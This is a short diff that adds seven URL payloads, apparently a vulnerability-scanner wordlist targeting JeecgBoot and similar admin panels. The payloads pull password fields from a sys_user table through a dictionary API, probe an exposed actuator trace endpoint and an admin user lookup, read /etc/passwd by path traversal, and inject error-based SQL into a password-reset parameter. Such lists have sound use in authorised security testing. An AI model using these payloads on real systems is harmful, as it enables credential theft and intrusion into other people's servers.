@@ -1,0 +1,7 @@
+/{{path}}sys/dict/loadTreeData?tableName=sys_user&text=password%20text,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username
+/{{path}}sys/dict/loadTreeData?tableName=sys_user+t&text=password,id&code=password&hasChildField=&converIsLeafVal=1&condition=&pid=admin&pidField=username
+/jeecg-boot/actuator/httptrace/
+/jeecg-boot/sys/user/querySysUser?username=admin
+/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd
+/a/sys/user/resetPassword?mobile=13588888888%27and%20(updatexml(1,concat(0x7e,(select%20md5({{num}})),0x7e),1))%23
+/jeecg-boot/
